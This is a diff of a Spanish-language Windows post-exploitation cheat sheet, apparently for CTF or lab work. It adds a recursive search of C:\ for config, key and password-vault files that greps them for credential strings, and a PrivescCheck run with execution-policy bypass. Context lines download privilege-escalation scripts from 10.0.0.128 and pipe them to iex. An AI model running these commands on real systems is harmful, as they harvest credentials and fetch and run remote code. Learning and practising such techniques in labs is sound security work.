@@ -5,9 +5,13 @@
 Get-ChildItem -Path C:\ -Recurse -Filter "flag.txt" -ErrorAction SilentlyContinue -Force
 ```
 
-- buscar
+- Buscar info
 ```bash
-Get-ChildItem -Path C: -Include *.ps1*,*.txt*,*.exe*,*.log*,*.ini*,*.kdbx*,*.pdf*,*.xls*,*.xlsx*,*.doc*,*.json*,*.kdbx*,*.kdb*,*.env*,*.docx* -File -Recurse -ErrorAction SilentlyContinue
+paste -sd, users | sed 's/[^,]*/"&"/g'
+
+#Luego
+
+Get-ChildItem -Path C:\ -Recurse -Force -Include *.config,*.ini,*.xml,*.bak,*.txt,*.ps1,*.log,*.json,*.yml,*.yaml,*.env,*.cs,*.vb,*.vbs,*.key,*.pem,*.crt,*.rdp,*.kdbx -File -ErrorAction SilentlyContinue | Where-Object { $_.FullName -notmatch '(C:\\Windows)' } | Select-String -Pattern "pwd=", "password=", "username=", "user=", "pass=", OUTPUT_ANTERIOR
 ```
 
 - Buscar archivos:
@@ -30,6 +34,9 @@ wget -useb 10.0.0.128/PowerUp.ps1| iex; Invoke-AllChecks
 
 
 wget -useb 10.0.0.128/PrivescCheck.ps1| iex; Invoke-PrivescCheck
+
+
+powershell.exe -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
 ```
 
 - Ver usuarios disponibles
